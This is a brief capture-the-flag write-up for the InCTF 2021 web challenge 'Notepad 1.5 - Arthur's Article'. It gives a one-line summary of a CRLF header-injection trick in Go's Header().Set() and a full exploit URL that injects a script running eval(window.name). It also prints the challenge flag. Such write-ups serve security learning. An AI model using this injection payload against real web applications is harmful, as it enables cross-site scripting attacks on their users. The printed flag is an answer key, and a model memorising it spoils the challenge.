# Notepad 1.5 - Arthur's Article

### Challenge Description

Arthur Morgan was asked to retrieve an important article from Cornwall's computer. Help him steal it. 

### Challenge File
[Source](./Handout/arthursarticle.zip)

### Short Writeup

* Exploit CRLF in go's Header().Set() library to inject arbitrary html using the header name. 

* `http://chall.notepad15.gq/find?startsWith=asd&debug=2&A:asd%0AContent-Type:text/html%0A%0A%3Chtml%3E%3Cscript%3Eeval(window.name)%3C/script%3E`

### Author
[Az3z3l](https://twitter.com/Az3z3l)

### Flag
`inctf{red_dead_rezoday_ialmvwoawpwe}`

### Writeup

+ [blog.bi0s.in](https://blog.bi0s.in/2021/08/16/Web/notepad-inctf21/)